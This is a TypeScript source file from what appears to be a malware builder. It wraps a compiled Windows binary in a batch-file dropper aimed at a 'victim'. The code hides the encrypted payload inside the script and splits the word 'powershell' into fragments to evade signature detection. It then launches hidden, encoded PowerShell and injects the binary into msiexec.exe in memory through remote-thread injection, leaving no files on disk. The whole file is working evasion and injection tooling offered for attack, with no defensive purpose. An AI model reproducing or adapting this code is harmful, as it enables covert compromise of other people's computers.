/**
 * bat-wrapper.ts — Wraps a compiled PE binary in a .bat/.cmd script that
 * injects the agent into msiexec.exe entirely in-memory.
 * No files are written to disk on the victim machine.
 *
 * Execution chain on victim:
 *   1. User double-clicks the .bat/.cmd file
 *   2. Batch reads encrypted payload from after the marker in itself
 *   3. cmd /v delayed expansion reassembles "powershell" to avoid static sigs
 *   4. PS decrypts (XOR + gzip) the PE bytes entirely in memory
 *   5. C# P/Invoke injector compiled via Add-Type (random class name per build)
 *   6. msiexec.exe started hidden (LOTL — signed MS binary, universal on Windows)
 *   7. PE manually mapped into msiexec via VirtualAllocEx + WriteProcessMemory
 *   8. Relocations + imports resolved remotely
 *   9. CreateRemoteThread at PE entry point
 *  10. Agent runs inside msiexec.exe — no temp files, no disk writes
 */

import { v4 as uuidv4 } from "uuid";
import {
  encryptPayload,
  randClassName,
  randHex,
  buildCSharpInjector,
  buildPsInjectionChain,
} from "./pe-injector";

/**
 * Generate a self-contained .bat/.cmd script with fileless PE injection.
 * Returns the full script content as a string.
 */
export function wrapPeAsBat(peBytes: Buffer): string {
  const encrypted = encryptPayload(peBytes);
  const b64Payload = encrypted.toString("base64");
  const b64Lines = b64Payload.match(/.{1,76}/g) || [b64Payload];

  const className = randClassName();
  const csharpCode = buildCSharpInjector(className);
  const csB64 = Buffer.from(csharpCode, "utf-8").toString("base64");

  const marker = `:OVD_${uuidv4().replace(/-/g, "").substring(0, 16).toUpperCase()}`;

  // PowerShell: read self, find marker, decode payload, decrypt, inject
  const psLines = [
    // Read self and extract base64 payload after marker
    `$f=$env:_OVD_SELF`,
    `$l=[IO.File]::ReadAllLines($f)`,
    `$i=0`,
    `for($j=0;$j-lt$l.Count;$j++){if($l[$j] -ceq '${marker}'){$i=$j+1;break}}`,
    `$d=[Convert]::FromBase64String(($l[$i..($l.Count-1)]-join''))`,
    // Decode C# injector from env var
    `$cs=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($env:_OVD_CS))`,
  ];

  const chain = buildPsInjectionChain("$d", "$cs", className, "msiexec.exe", "/q");
  const psScript = psLines.join(";") + ";" + chain;
  const psEnc = Buffer.from(psScript, "utf16le").toString("base64");

  // Split C# base64 across multiple set commands to stay under cmd line limits
  // Each chunk must be small enough for a set command (~8000 chars safe)
  const csChunkSize = 4000;
  const csChunks = csB64.match(new RegExp(`.{1,${csChunkSize}}`, "g")) || [csB64];

  const rnd = randHex(6);
  const lines: string[] = [
    `@echo off`,
    `setlocal enabledelayedexpansion`,
    `set "_OVD_SELF=%~f0"`,
  ];

  // Build C# source base64 in chunks to avoid line length issues
  if (csChunks.length === 1) {
    lines.push(`set "_OVD_CS=${csChunks[0]}"`);
  } else {
    lines.push(`set "_OVD_CS=${csChunks[0]}"`);
    for (let i = 1; i < csChunks.length; i++) {
      lines.push(`set "_OVD_CS=!_OVD_CS!${csChunks[i]}"`);
    }
  }

  // cmd /v delayed expansion to reassemble "powershell" from fragments
  lines.push(
    `set "${rnd}a=pow"`,
    `set "${rnd}b=er"`,
    `set "${rnd}c=she"`,
    `set "${rnd}d=ll"`,
    `!${rnd}a!!${rnd}b!!${rnd}c!!${rnd}d! -nop -w h -ep b -enc ${psEnc}`,
    `endlocal`,
    `exit /b 0`,
    marker,
    ...b64Lines,
  );

  return lines.join("\r\n") + "\r\n";
}
